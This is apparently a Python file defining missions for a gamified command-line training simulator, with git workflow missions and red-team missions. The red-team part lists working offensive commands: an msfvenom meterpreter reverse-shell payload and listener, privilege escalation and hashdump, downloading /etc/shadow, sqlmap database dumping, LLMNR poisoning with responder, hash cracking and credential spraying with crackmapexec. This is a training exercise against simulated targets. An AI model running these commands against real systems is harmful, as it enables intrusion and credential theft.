"""
scenarios/git_redteam_missions.py
New missions for git and redteam modules.
Import and extend SCENARIOS in missions.py
"""

from scenarios.checks import ran, ran_any, either

GIT_MISSIONS = [
    {
        "id": "git01",
        "title": "First Commit",
        "category": "git",
        "difficulty": 1,
        "tags": ["GIT", "EASY"],
        "story": (
            "Initialize a git repository for the portfolio project, "
            "stage all your files, and make your first commit. "
            "Then add a remote origin and push to it."
        ),
        "steps": [
            ("Initialize a git repo",
             lambda w, s: bool(w.git_repos),
             "git init my-portfolio"),
            ("Stage all files",
             lambda w, s: any(r.get("staged") for r in w.git_repos.values()),
             "git add ."),
            ("Make the first commit",
             lambda w, s: any(r.get("commits") for r in w.git_repos.values()),
             'git commit -m "initial commit: portfolio"'),
            ("Add a remote origin",
             lambda w, s: any(r.get("remotes") for r in w.git_repos.values()),
             "git remote add origin git@github.com:dev/my-portfolio.git"),
            ("Push to origin",
             lambda w, s: any(
                 any(c.get("pushed") for c in r.get("commits", []))
                 for r in w.git_repos.values()
             ),
             "git push -u origin main"),
        ],
        "xp_reward": 70,
    },

    {
        "id": "git02",
        "title": "Branch & Merge Workflow",
        "category": "git",
        "difficulty": 2,
        "tags": ["GIT", "MEDIUM"],
        "story": (
            "Practice the feature branch workflow. "
            "Create a feature branch, make commits on it, "
            "then merge it back to main with --no-ff to preserve history. "
            "Use git log --oneline --graph to verify."
        ),
        "steps": [
            ("Create a feature branch",
             lambda w, s: any(
                 len(r.get("branches", [])) > 1
                 for r in w.git_repos.values()
             ),
             "git checkout -b feature/navbar"),
            ("Stage and commit on the feature branch",
             lambda w, s: any(
                 len(r.get("commits", [])) >= 2
                 for r in w.git_repos.values()
             ),
             'git add . && git commit -m "feat: add navbar component"'),
            ("Switch back to main",
             lambda w, s: any(
                 r.get("branch") == "main"
                 for r in w.git_repos.values()
             ),
             "git checkout main"),
            ("Merge feature branch with --no-ff",
             lambda w, s: any(
                 any("Merge" in c.get("msg", "") for c in r.get("commits", []))
                 for r in w.git_repos.values()
             ),
             "git merge --no-ff feature/navbar"),
            ("Review the commit graph",
             ran("git log"),
             "git log --oneline --graph --all"),
        ],
        "xp_reward": 90,
    },

    {
        "id": "git03",
        "title": "Interactive Rebase & Stash",
        "category": "git",
        "difficulty": 3,
        "tags": ["GIT", "HARD"],
        "story": (
            "You have messy commits that need cleaning before a PR. "
            "Use git stash to shelve current work, then interactive rebase "
            "to squash the last 3 commits into one clean commit. "
            "Pop the stash when done."
        ),
        "steps": [
            ("Stash your current uncommitted work",
             lambda w, s: any(r.get("stashes") for r in w.git_repos.values()),
             "git stash push -m 'WIP: in-progress feature'"),
            ("Interactive rebase to squash last 3 commits",
             ran("git rebase"),
             "git rebase -i HEAD~3"),
            ("Verify the cleaned log",
             ran("git log"),
             "git log --oneline"),
            ("Pop your stashed work back",
             ran("git stash pop"),
             "git stash pop"),
            ("Push the cleaned history",
             ran("git push"),
             "git push --force-with-lease origin main"),
        ],
        "xp_reward": 120,
    },

    {
        "id": "git04",
        "title": "Recovery & Bisect",
        "category": "git",
        "difficulty": 3,
        "tags": ["GIT", "HARD"],
        "story": (
            "A bug was introduced somewhere in the last 10 commits. "
            "Use git bisect to binary-search the bad commit. "
            "Then use git revert to safely undo it without rewriting history. "
            "Finally, use git reflog to confirm HEAD movement."
        ),
        "steps": [
            ("Start bisect session",
             ran("git bisect start"),
             "git bisect start"),
            ("Mark current HEAD as bad",
             ran("git bisect bad"),
             "git bisect bad HEAD"),
            ("Mark a known good commit",
             ran("git bisect good"),
             "git bisect good HEAD~5"),
            ("Revert the guilty commit",
             lambda w, s: any(
                 any("Revert" in c.get("msg", "") for c in r.get("commits", []))
                 for r in w.git_repos.values()
             ),
             "git revert HEAD"),
            ("Check the reflog for full history",
             ran("git reflog"),
             "git reflog"),
        ],
        "xp_reward": 130,
    },

    {
        "id": "git05",
        "title": "Git + Docker CI Workflow",
        "category": "combo: git + docker",
        "difficulty": 3,
        "tags": ["GIT", "DOCKER", "COMBO", "HARD"],
        "story": (
            "Full DevOps workflow: commit your Dockerfile changes to git, "
            "build the Docker image tagged with the git short hash, "
            "run it, verify it, then tag the release in git. "
            "This mirrors a real CI/CD pipeline."
        ),
        "steps": [
            ("Commit the Dockerfile",
             lambda w, s: any(
                 any("docker" in c.get("msg", "").lower() or "dockerfile" in c.get("msg", "").lower()
                     for c in r.get("commits", []))
                 for r in w.git_repos.values()
             ),
             'git add Dockerfile && git commit -m "chore: update Dockerfile for production"'),
            ("Build Docker image tagged with git hash",
             lambda w, s: any("sysops" in img for img in w.docker_images),
             "docker build -t sysops-app:v1 ."),
            ("Run the container",
             lambda w, s: any(
                 c.get("status") == "running" and "sysops" in c.get("image", "")
                 for c in w.docker_containers.values()
             ),
             "docker run -d --name sysops-app -p 3000:3000 sysops-app:v1"),
            ("Verify it is running",
             ran("docker ps"),
             "docker ps"),
            ("Tag the release in git",
             lambda w, s: any(r.get("tags") for r in w.git_repos.values()),
             "git tag -a v1.0.0 -m 'Release v1.0.0'"),
        ],
        "xp_reward": 150,
    },
]

REDTEAM_MISSIONS = [
    {
        "id": "rt01",
        "title": "Passive Recon",
        "category": "redteam — recon",
        "difficulty": 2,
        "tags": ["SECURITY", "CYBER", "MEDIUM"],
        "story": (
            "You have been assigned to test acme-corp.local. "
            "Start with passive reconnaissance: harvest emails and subdomains "
            "with theHarvester, enumerate DNS with dnsenum, "
            "then confirm what you have found with amass."
        ),
        "steps": [
            ("Run theHarvester against the target domain",
             lambda w, s: bool(getattr(w, "rt_state", {}).get("emails")),
             "theHarvester -d acme-corp.local -b all"),
            ("Enumerate DNS records and attempt zone transfer",
             ran("dnsenum"),
             "dnsenum acme-corp.local"),
            ("Run amass for deeper subdomain enumeration",
             lambda w, s: len(getattr(w, "rt_state", {}).get("subdomains", [])) >= 5,
             "amass enum -passive -d acme-corp.local"),
            ("Check registrar info",
             ran("whois"),
             "whois acme-corp.local"),
        ],
        "xp_reward": 100,
    },

    {
        "id": "rt02",
        "title": "Weaponize & Listen",
        "category": "redteam — weaponize",
        "difficulty": 3,
        "tags": ["SECURITY", "CYBER", "HARD"],
        "story": (
            "Recon is done. Time to prepare your payload. "
            "Search for exploits with searchsploit, generate a "
            "Linux reverse shell payload with msfvenom, "
            "then open msfconsole and set up a listener."
        ),
        "steps": [
            ("Search for relevant exploits",
             ran("searchsploit"),
             "searchsploit apache 2.4"),
            ("Generate a reverse shell payload",
             ran("msfvenom"),
             "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=100.64.1.10 LPORT=4444 -f elf -o shell.elf"),
            ("Open msfconsole",
             ran("msfconsole"),
             "msfconsole"),
            ("Inside msf: use the multi/handler and run it",
             lambda w, s: getattr(w, "rt_state", {}).get("listener_up", False),
             "use exploit/multi/handler → set LHOST 100.64.1.10 → run"),
        ],
        "xp_reward": 130,
    },

    {
        "id": "rt03",
        "title": "Exploit & Escalate",
        "category": "redteam — exploit + post",
        "difficulty": 3,
        "tags": ["SECURITY", "CYBER", "HARD"],
        "story": (
            "You have a shell. Now escalate. Run linPEAS to find "
            "privilege escalation paths, use pspy to catch credential leaks "
            "in process arguments, then attempt getsystem inside msfconsole. "
            "Dump hashes once you have root."
        ),
        "steps": [
            ("Run linPEAS for privesc vectors",
             ran("linpeas"),
             "linpeas"),
            ("Run pspy to monitor processes for credentials",
             lambda w, s: len(getattr(w, "rt_state", {}).get("loot", [])) > 0,
             "pspy"),
            ("Open msfconsole and escalate privileges",
             lambda w, s: getattr(w, "rt_state", {}).get("privesc_done", False),
             "msfconsole → sessions -i 1 → getsystem"),
            ("Dump password hashes",
             lambda w, s: any(
                 "shadow" in l or "hashdump" in l
                 for l in getattr(w, "rt_state", {}).get("loot", [])
             ),
             "msfconsole → sessions -i 1 → hashdump"),
        ],
        "xp_reward": 160,
    },

    {
        "id": "rt04",
        "title": "Web Application Attack",
        "category": "redteam — web",
        "difficulty": 3,
        "tags": ["SECURITY", "CYBER", "HARD"],
        "story": (
            "The target has a web application. Use gobuster to enumerate "
            "hidden paths, nikto to find vulnerabilities, "
            "and sqlmap to extract the user database via SQL injection."
        ),
        "steps": [
            ("Enumerate web directories",
             ran("gobuster"),
             "gobuster dir -u http://100.64.1.20 -w /usr/share/wordlists/dirb/common.txt"),
            ("Run nikto web vulnerability scan",
             ran("nikto"),
             "nikto -h 100.64.1.20"),
            ("Test for SQL injection",
             ran("sqlmap"),
             "sqlmap -u 'http://100.64.1.20/login.php?id=1' --dbs"),
            ("Dump the users table",
             lambda w, s: any(
                 "Database dump" in l
                 for l in getattr(w, "rt_state", {}).get("loot", [])
             ),
             "sqlmap -u 'http://100.64.1.20/login.php?id=1' --dump"),
        ],
        "xp_reward": 140,
    },

    {
        "id": "rt05",
        "title": "Network Lateral Movement",
        "category": "redteam — lateral movement",
        "difficulty": 4,
        "tags": ["SECURITY", "CYBER", "COMBO"],
        "story": (
            "NIGHTMARE. You have a foothold. Move laterally. "
            "Use enum4linux to map SMB shares, responder to capture "
            "NTLMv2 hashes from the network, crack them with hashcat, "
            "then authenticate with crackmapexec. Write the final report."
        ),
        "steps": [
            ("Enumerate SMB with enum4linux",
             ran("enum4linux"),
             "enum4linux -a 100.64.1.20"),
            ("Poison LLMNR to capture NTLMv2 hashes",
             lambda w, s: any(
                 "NTLMv2" in l
                 for l in getattr(w, "rt_state", {}).get("loot", [])
             ),
             "responder -I eth0"),
            ("Crack captured hashes",
             ran("hashcat"),
             "hashcat -m 5600 Responder/logs/NTLMv2.txt /usr/share/wordlists/rockyou.txt"),
            ("Authenticate across the network with CME",
             lambda w, s: getattr(w, "rt_state", {}).get("exploited", False),
             "crackmapexec smb 100.64.1.0/24 -u admin -p password123"),
            ("Generate the engagement report",
             ran("report"),
             "report engagement_report.md"),
        ],
        "xp_reward": 250,
    },

    {
        "id": "rt06",
        "title": "Full Kill Chain",
        "category": "redteam — full engagement",
        "difficulty": 4,
        "tags": ["SECURITY", "CYBER", "COMBO"],
        "story": (
            "NIGHTMARE. Run the complete kill chain end-to-end. "
            "Recon → Weaponize → Exploit → Post-Exploit → Report. "
            "Every phase must be completed. This is the capstone red team mission."
        ),
        "steps": [
            ("Phase 1 — Recon: harvest emails and subdomains",
             lambda w, s: bool(getattr(w, "rt_state", {}).get("emails")),
             "theHarvester -d acme-corp.local -b all"),
            ("Phase 2 — Weaponize: generate payload",
             ran("msfvenom"),
             "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=100.64.1.10 LPORT=4444 -f elf -o shell.elf"),
            ("Phase 3 — Exploit: gain shell via msfconsole",
             lambda w, s: getattr(w, "rt_state", {}).get("exploited", False),
             "msfconsole → use exploit/multi/handler → run"),
            ("Phase 4 — Post: run linPEAS and escalate",
             lambda w, s: getattr(w, "rt_state", {}).get("privesc_done", False),
             "linpeas  then  msfconsole → sessions -i 1 → getsystem"),
            ("Phase 5 — Post: dump hashes and loot",
             lambda w, s: len(getattr(w, "rt_state", {}).get("loot", [])) >= 2,
             "hashdump  then  download /etc/shadow"),
            ("Phase 6 — Report: generate engagement report",
             ran("report"),
             "report full_engagement.md"),
            ("Show kill chain status",
             ran("killchain"),
             "killchain"),
        ],
        "xp_reward": 350,
    },
]
